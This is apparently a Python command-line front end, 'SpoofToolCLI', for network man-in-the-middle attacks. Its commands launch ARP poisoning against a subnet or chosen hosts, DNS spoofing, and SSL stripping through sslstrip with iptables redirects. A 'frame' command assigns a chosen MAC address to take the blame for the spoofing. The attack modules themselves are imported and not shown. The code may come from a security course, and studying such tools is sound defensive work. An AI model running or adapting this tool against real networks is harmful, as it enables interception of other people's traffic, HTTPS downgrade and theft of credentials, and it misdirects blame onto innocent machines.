import cmd
import os
import sys

import argparse
import threading
import subprocess
import atexit

import arp_spoofing
import dns_spoofing
import proxy

import scapy.all as scapy
from netfilterqueue import NetfilterQueue

is_arp_running = False

# I guess for now we will have individual functions for each command,
#  but later we can just have one function tha does arp_spoofing, dns_spoofing and ssl stripping

class SpoofToolCLI(cmd.Cmd):
    prompt = 'SpoofTool>> '
    intro = '\nWelcome to SpoofToolCLI. Type "help" for available commands.'

    def __init__(self):
        #super(SpoofToolCLI, self).__init__()
        cmd.Cmd.__init__(self)
        self.current_directory = os.getcwd()

    # example of a command
    # def do_list(self, line):
    #     The text inside the triple quotes is the help text that will be displayed when the user types "help"
    #     """List files and directories in the current directory."""
    #     files_and_dirs = os.listdir(self.current_directory)
    #     for item in files_and_dirs:
    #         print(item)

    def do_arp_spoof(self, line):
        """Spoof ARP packets."""
        parser = argparse.ArgumentParser(prog='arp_spoof', description='Spoof ARP packets')
        parser.add_argument('-s', '--silent', action='store_true', help='Silent mode (no active scanning for IP addresses)')
        parser.add_argument('-m', '--manual', nargs='*', help='Manual input of IP addresses (default is entire subnet). Also requires --router.')
        parser.add_argument('-r', '--router', help='Gateway router')
        parser.add_argument('-i', '--iface', default='enp0s10', help='Network Interface (default: enp0s10)')
        
        try:
            args = parser.parse_args(line.split())
        except SystemExit:
            return  # argparse tries to exit the application when it fails
        
        # Pass parsed arguments to the arp_main function or handle them here
        if args.manual:
            print("Manual IP addresses: {}.".format(', '.join(args.manual)))
        if args.router:
            print("Gateway router: {}.".format(args.router))
        if args.iface:
            print("Network interface: {}".format(args.iface))
        if args.silent:
            print("Silent mode enabled.")

        # Start to ARP poison with the parsed arguments
        print("ARP spoofing started")
        global is_arp_running
        is_arp_running = True

        if not args.manual and not args.silent: #auto setup (loud) :)
            arp_spoofing.arp_prep_automated(args.router, args.iface)
            arp_spoofing.arp_run()
        elif args.manual and not args.silent:  #manual (loud)
            arp_spoofing.arp_prep(args.manual, args.router, args.iface)
            arp_spoofing.arp_run()
        else: # silent mode (silent)
            arp_spoofing.arp_prep_silent(args.iface, args.router)
        return
        

    def do_dns_spoof(self, line):
        """Spoof DNS packets. Run ARP First.Does not work together with SSL stripping."""
        parser = argparse.ArgumentParser(prog='dns_spoof', description='Spoof DNS packets.')
        parser.add_argument('-m', '--manual', nargs='*', help='Manual input of urls (default: all)')
        parser.add_argument('-i', '--iface', default='enp0s10', help='Network Interface (default: enp0s10)')
        parser.add_argument('-t', '--target', help='Target IP (default is google.com\'s)')

        try:
            args = parser.parse_args(line.split())
        except SystemExit:
            return  # argparse tries to exit the application when it fails
        
        if args.manual:
            print("Manual URL addresses: {}.".format(', '.join(args.manual)))
            for url in args.manual:
                url = url.replace("http://", "").replace("https://", "").replace("www.", "")
        if args.iface:
            print("Network interface: {}".format(args.iface))
        if args.target:
            print("Target IP: {}".format(args.target))
            dns_spoofing.destination_ip = args.target

        print("DNS spoofing started")
    
        dns_spoofing.urls = args.manual
        dns_spoofing.IFACE = args.iface
        proxy.setup_proxy()
        return

    ssl_process = None
    def do_ssl_strip(self, line):
        """Turns on ssl stripping (using moxie ssl_strip). Run ARP First. Does not work together with DNS spoofing"""
        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
        os.system("sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
        os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
        os.system("sudo iptables -A FORWARD -j ACCEPT")
        global ssl_process
        ssl_process = subprocess.Popen("sudo python sslstrip-package/sslstrip.py", shell=True, stderr=open(os.devnull, 'wb'))
        return
    
    def do_frame(self, line):   
        """Only for silent ARP spoofing. Frame given mac to be the bad guy. In loud mode takes many IP's. In silent mode just the attacker ip"""
        parser = argparse.ArgumentParser(prog='frame', description='Frame given mac to be the bad guy.')
        parser.add_argument('-m', '--mac', default='ff:ff:ff:ff:ff:ff', help='MAC address to frame.')
        parser.add_argument('-l', '--loud', action='store_true', help="Loud, takes many IP's (default=False)")

        try:
            args = parser.parse_args(line.split())
        except SystemExit:
            return
        
        arp_spoofing.framed_mac = args.mac

        if args.loud:
            print("Loud framing mode enabled.")
            print("Framing MAC address: {}".format(args.mac))
            arp_spoofing.loud_framing = True
        else:
            print("Silent framing mode enabled.")
            print("Framing MAC address: {}".format(args.mac))
            arp_spoofing.loud_framing = False
        
        arp_spoofing.arp_framing = True
        


    def do_clear(self, line):
        """Clear the screen."""
        # 'clear' for Unix-based systems, 'cls' for Windows
        os.system('cls' if os.name == 'nt' else 'clear')

    def do_quit(self, line):
        """Quit the program."""
        print("Goodbye!")
        return True
    
    def do_exit(self, line):
        """Quit the program."""
        print("Goodbye!")
        return True

    def postcmd(self, stop, line):
        print("")
        return stop
    
    def do_help(self, arg):
        """Help command."""
        if arg:
            try:
                func = getattr(self, 'do_' + arg)
                if func:
                    print(func.__doc__)
            except AttributeError:
                print("No help available for '{}'".format(arg))
        else:
            self.print_custom_help()
    
    def print_custom_help(self):
        """Print custom help message."""
        print("\nDocumented commands (type <command> -h for command usage.)\n")
        commands = [cmd for cmd in self.get_names() if cmd.startswith('do_')]
        for command in commands:
            cmd_name = command[3:]
            func = getattr(self, command)
            if func.__doc__:
                print("{:<30}{}".format(cmd_name, func.__doc__.splitlines()[0]))
            else:
                print("{}\tNo description available.".format(cmd_name))

    def cmdloop(self, intro=None):
        while True:
            try:
                cmd.Cmd.cmdloop(self, intro=intro)
                self.postloop()
                break 
            except KeyboardInterrupt:
                print("^C")
                exit()


def exit_handler():
        arp_spoofing.arp_looping = False
        if arp_spoofing.arp_thread is not None:
            arp_spoofing.arp_thread.join()

        arp_spoofing.arp_scouting = False
        if arp_spoofing.arp_scouting_thread is not None:
            arp_spoofing.arp_scouting_thread.join()
        
        proxy.undo_iptables()
        if proxy.nfqueue is not None:
            proxy.nfqueue.unbind()

        if ssl_process is not None:
            ssl_process.terminate()

        os.system("sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
        os.system("sudo iptables -D FORWARD -j ACCEPT")
        exit()

if __name__ == '__main__':
    cli = SpoofToolCLI()

    atexit.register(exit_handler)

    cli.cmdloop()

#wh